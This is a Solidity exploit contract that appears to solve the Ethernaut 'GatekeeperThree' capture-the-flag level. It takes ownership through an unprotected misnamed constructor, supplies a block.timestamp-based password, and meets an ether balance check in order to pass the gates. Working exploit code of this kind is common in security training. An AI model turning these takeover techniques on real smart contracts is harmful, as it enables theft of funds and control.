//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// GK3 contract --  0x02FaA8ab41AEa3a9965262C9e7960FC4e479B65c
interface IGateKeeperThree {

function construct0r() external;
function createTrick() external;
function getAllowance(uint _password) external;
function enter() external;
function entrant() external view returns(address);

}

/*
1. call GK3.construct0r()
2. call GK3.createTrick()

3. getStorageAt(simpletrick, block.timestamp slot)

4. call GK3.getAllowance(password - block.timestamp)
5. send 0.002 ether to GK contract

*/

contract GatekeeperThreePwn {

//send 0.002 ether while deploying
constructor() payable {}

function Gk3Pwn(address _GkAddr) public {

IGateKeeperThree gateKeeperThree = IGateKeeperThree(_GkAddr);
//Gate one clear -  become owner  
gateKeeperThree.construct0r();

//Gate two clear - allowEntrance should be true
gateKeeperThree.createTrick();
gateKeeperThree.getAllowance(block.timestamp);


// Gate Three clear - 
// satisfy (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false)

//first condition will pass if we send 0.001 ether to the Gk contract

(bool sent, ) = payable(address(gateKeeperThree)).call{value : address(this).balance}("");
require(sent, "Eth transfer failed");

gateKeeperThree.enter();

require(gateKeeperThree.entrant() == msg.sender , "Pwn Failed ser"); 
}

}